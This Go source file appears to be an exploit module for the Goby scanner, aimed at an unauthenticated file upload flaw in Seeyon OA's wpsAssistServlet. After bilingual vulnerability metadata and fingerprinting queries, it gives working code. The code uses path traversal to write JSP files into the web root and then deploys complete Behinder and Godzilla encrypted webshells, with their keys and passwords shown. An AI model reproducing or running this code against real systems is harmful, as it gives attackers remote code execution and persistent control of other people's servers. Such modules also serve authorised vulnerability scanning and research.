package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "strings"
)

func init() {
  expJson := `{
    "Name": "seeyon OA wpsAssistServlet file upload vulnerability",
    "Description": "<p>seeyon OA is a collaborative management software, a digital collaborative operation platform for medium and large group organizations.</p><p>The vulnerability is due to the fact that the interface /seeyon/wpsAssistServlet does not perform strict verification on uploaded files, resulting in an arbitrary file upload vulnerability in the system. An unauthenticated attacker can use this vulnerability to remotely send a carefully constructed backdoor file, obtain the permissions of the target server, execute arbitrary code on the target system, and achieve remote code execution.</p>",
    "Impact": "<p>Attackers can use this vulnerability to execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>At present, the manufacturer has not issued any repair measures to solve this security problem. Users using this software are advised to pay attention to the manufacturer's home page or refer to the website for solutions：<a href=\"http://www.seeyon.com/\">http://www.seeyon.com/</a></p>",
    "Product": "seeyon-OA",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "Translation": {
        "CN": {
            "Name": "致远 OA wpsAssistServlet 文件上传漏洞",
            "Product": "致远互联-OA",
            "Description": "<p>致远 OA 是一款协同管理软件，是面向中型、大型集团型组织的数字化协同运营平台。</p><p>该漏洞是由于接口 /seeyon/wpsAssistServlet 对上传文件未进行严格的校验导致系统存在任意文件上传漏洞。未经身份验证的攻击者利用该漏洞远程发送精心构造的后门文件，获得目标服务器的权限，在目标系统上执行任意代码，实现远程代码执行。</p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"http://www.seeyon.com/\">http://www.seeyon.com/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "seeyon OA wpsAssistServlet file upload vulnerability",
            "Product": "seeyon-OA",
            "Description": "<p>seeyon OA is a collaborative management software, a digital collaborative operation platform for medium and large group organizations.</p><p>The vulnerability is due to the fact that the interface /seeyon/wpsAssistServlet does not perform strict verification on uploaded files, resulting in an arbitrary file upload vulnerability in the system. An unauthenticated attacker can use this vulnerability to remotely send a carefully constructed backdoor file, obtain the permissions of the target server, execute arbitrary code on the target system, and achieve remote code execution.</p>",
            "Recommendation": "<p>At present, the manufacturer has not issued any repair measures to solve this security problem. Users using this software are advised to pay attention to the manufacturer's home page or refer to the website for solutions：<a href=\"http://www.seeyon.com/\">http://www.seeyon.com/</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "FofaQuery": "(body=\"/seeyon/main.do\" && body=\"/seeyon/common/\") || server==\"SY8045\" || server==\"SY8044\"",
    "GobyQuery": "(body=\"/seeyon/main.do\" && body=\"/seeyon/common/\") || server==\"SY8045\" || server==\"SY8044\"",
    "Author": "sharecast",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2022-07-24",
    "References": [
        "https://www.seeyon.com/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.8",
    "PocId": "10477"
}`

  sendPayloadb71032ea := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
    cfg := httpclient.NewPostRequestConfig("/seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/" + filename + "&fileId=1")
    cfg.VerifyTls = false
    cfg.FollowRedirect = false
    boundary := goutils.RandomHexString(32)
    cfg.Header.Store("Content-Type", "multipart/form-data; boundary="+boundary)
    cfg.Data = strings.ReplaceAll(`--`+boundary+`
Content-Disposition: form-data; name="file"; filename="`+goutils.RandomHexString(10)+`.txt"
Content-Type: application/octet-stream

`+content+`
--`+boundary+`--`, "\n", "\r\n")
    _, err := httpclient.DoHttpRequest(hostInfo, cfg)
    if err != nil {
      return nil, err
    }

    return httpclient.SimpleGet(hostInfo.HostInfo + "/" + filename)
  }

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      checkStr := goutils.RandomHexString(16)
      filename := goutils.RandomHexString(16) + ".jsp"
      rsp, err := sendPayloadb71032ea(u, filename, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>")
      if err != nil {
        return false
      }
      return strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "out.println")
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      content := goutils.B2S(ss.Params["content"])
      filename := goutils.B2S(ss.Params["filename"])
      attackType := goutils.B2S(ss.Params["attackType"])
      webshell := goutils.B2S(ss.Params["webshell"])
      if attackType == "webshell" {
        filename = goutils.RandomHexString(16) + ".jsp"
        if webshell == "behinder" {
          content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
        } else if webshell == "godzilla" {
          // 哥斯拉 pass key
          content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
        }
      }
      rsp, err := sendPayloadb71032ea(expResult.HostInfo, filename, content)
      if err != nil {
        expResult.Success = false
        expResult.Output = err.Error()
        return expResult
      }
      // 资源存在
      if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
        expResult.Success = false
        expResult.Output = "漏洞利用失败"
        return expResult
      }
      expResult.Success = true
      if attackType == "webshell"{
        expResult.Output = "WebShell "
      }
      expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
      if attackType != "custom" && webshell == "behinder" {
        expResult.Output += "Password: rebeyond\n"
        expResult.Output += "WebShell tool: Behinder v3.0\n"
      } else if attackType != "custom" && webshell == "godzilla" {
        expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
        expResult.Output += "WebShell tool: Godzilla v4.1\n"
      }
      if attackType == "webshell"{
        expResult.Output += "Webshell type: jsp"
      }
      return expResult
    },
  ))
}
